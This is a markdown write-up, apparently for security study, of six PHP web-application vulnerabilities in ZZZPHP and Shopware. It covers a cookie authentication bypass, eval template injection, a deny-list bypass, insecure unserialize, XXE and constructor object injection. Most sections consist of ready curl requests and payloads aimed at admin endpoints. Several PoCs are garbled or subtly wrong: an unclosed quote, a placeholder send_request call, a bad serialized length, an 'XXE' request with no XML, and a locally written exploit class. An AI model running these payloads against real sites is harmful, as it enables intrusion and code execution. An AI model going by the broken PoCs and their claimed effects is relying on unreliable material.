# PHP Vulnerabilities

### 1) ZZZPHP ISSESSION adminid Authentication Bypass

#### Vulnerability Analysis

- The application employs a session management mechanism with the option
to use cookies instead.

- Authentication is checked using the get_session() function.

- The ISSESSION constant determines whether to use session or cookie for storage.

- The get_session() function returns user-controlled data if ISSESSION is set to 0.

- The ISSESSION constant is defined as 0, allowing an attacker to manipulate
session data.

- The absence of proper authentication checks allows unauthorized access.

#### PoC

- Sending a request with a crafted cookie grants access without proper authentication.

- Without the cookie, the server redirects to the login page due to failed authentication.

This command sends a GET request to the admin page with the crafted cookie zzz_adminid=1 , bypassing authentication:

      export TARGET_HOST="target:8080
      curl -i -X GET "http://$TARGET_HOST/admin871/?index" -H "Cookie: zzz_adminid=1"

### 2) ZZZPHP parserIfLabel eval PHP Code Injection

#### Vulnerability Analysis

1. Injection Stage:

- The vulnerability allows an attacker to inject arbitrary PHP code into a specific file, in this case, search.html .

- The injection point is within the {if: ... } {end if} template syntax.

2. Execution Stage:

- After injection, the PHP code injected into search.html is executed due to improper handling of template parsing.

- The vulnerable code relies on the eval() function, which executes the injected PHP code.

#### PoC

This command sends a POST request to edit search.html , injecting the PHP code phpinfo() into it.

1. Injecting PHP Code:

        export TARGET_HOST="target:8080"
        curl -X POST "http://$TARGET_HOST/admin871/save.php?act=editfile" -H "Cookie: zzz_adminid=1" -d "file=/template/pc/cn2016/html/search.html&filetext={if:phpinfo()}{end if}"

2. Triggering Execution:

- After injecting the PHP code, accessing the search.html page or triggering its rendering will execute the injected code.

- The execution results in the phpinfo() function being called, disclosing sensitive server information.

### 3) The Ev1l eva1 Deny list

1. The getform() function filters user input but doesn't check $_SERVER , $_REQUEST ,and $_COOKIE .

2. The txt_html() function replaces instances of "eval" with "eva1", attempting to prevent its execution.

3. However, this can be bypassed creatively to achieve code execution.

#### PoC

      <?php
      // Crafted input with 'eval' bypass
      $input = [
      'user_input' => 'eval',
      'server_input' => '<?php phpinfo(); ?>', // Server input
      'cookie_input' => 'cookie_value', // Cookie input
      ];
      // Send the request with crafted input
      // Target the vulnerable function
      send_request($input);

Explanation:

- Craft input containing "eval" in the $_POST data.

- Include PHP code in $_SERVER data.

- The server will process the $_POST data, executing the PHP code in $_SERVER .

- Achieve dynamic code execution despite the "eval" replacement.

### 4) Shopware PHP Object Instantiation

The vulnerability lies in the deserialization process of user-controlled data in the Shopware application, specifically in the ProductStream.php controller. The sort parameter is passed to the unserialize() method, which leads to the execution of arbitrary code due to insecure deserialization.

#### PoC

Craft malicious serialized data with arbitrary code execution

      $serialized_data = 'O:4:"Evil":1:{s:4:"exec";s:8:"phpinfo()";}';

Send the request with crafted serialized data

      curl -X POST "http://target:8080/backend/ProductStream/loadPreview" -d "sort=$serialized_data" -H "Content-Type: application/x-www-form-urlencoded" -u "demo:demo"

Explanation:

- Craft malicious serialized data containing PHP code to execute phpinfo().

- Send the request to the vulnerable endpoint with the crafted serialized data.

- The application deserializes the data and executes the arbitrary PHP code.

### 5) XML Parsing

The vulnerability lies in the XML parsing functionality of the Shopware application, specifically in the handling of external entities. XML External Entity (XXE) injection occurs when the XML parser processes malicious XML data containing references to external entities, leading to various attacks such as information disclosure, server-side request forgery (SSRF), denial of service, and even remote code execution.

#### PoC

Generate CSRF token with authenticated session

      curl -X GET "http://target:8080/backend/CSRFToken/generate" -H "Cookie: SHOPWAREBACKEND=hd3loipaud5dj4mksts2l2ssj1"

Send malicious request triggering XXE injection

      curl -X GET "http://target:8080/backend/ProductStream/loadPreview?sort={}" -H "X-CSRF-Token: s2mwtrAQE4D6wofVRArlVKDGgzQQdQ" -H "Cookie: SHOPWAREBACKEND=6ni6hpb61nu0699siq9judjpcs" -d "{}"

Explanation:

- Generate a CSRF token using the authenticated session.

- Craft a request to the vulnerable endpoint with a malicious JSON payload containing an empty object {} for the sort parameter.

- The application processes the JSON payload, triggering the XXE vulnerability by parsing the XML data from the attacker-supplied URI.

### 6) Crafting the SimpleXMLElement Object for Object Injection

The vulnerability revolves around crafting malicious objects in PHP, particularly leveraging magic methods like __construct for object injection. This can lead to various forms of exploitation, including deserialization attacks and potentially remote code execution

#### PoC

Search for interesting classes and constructors

      grep -ir "__construct" engine/Shopware/ custom/plugins/custom/project/

Craft malicious object with __construct payload

      echo '<?php class Foo { public function __construct($name) { eval($name); }} ?>' > exploit.php
      echo '{"Foo":{"name":"system(\'id\');" }}' > payload.json

Trigger object instantiation with crafted payload

      curl -X GET "http://target:8080/backend/ProductStream/loadPreview?sort=$(cat payload.json)" -H "X-CSRF-Token: s2mwtrAQE4D6wofVRArlVKDGgzQQdQ" -H "Cookie: SHOPWAREBACKEND=6ni6hpb61nu0699siq9judjpcs"

Explanation:

- Search for classes and constructors to identify potential targets for exploitation.

- Craft a PHP file defining a class with a malicious __construct method, allowing arbitrary code execution.

- Generate a JSON payload specifying the class name and constructor arguments.

- Send a crafted request to trigger object instantiation with the malicious payload, potentially leading to code execution.

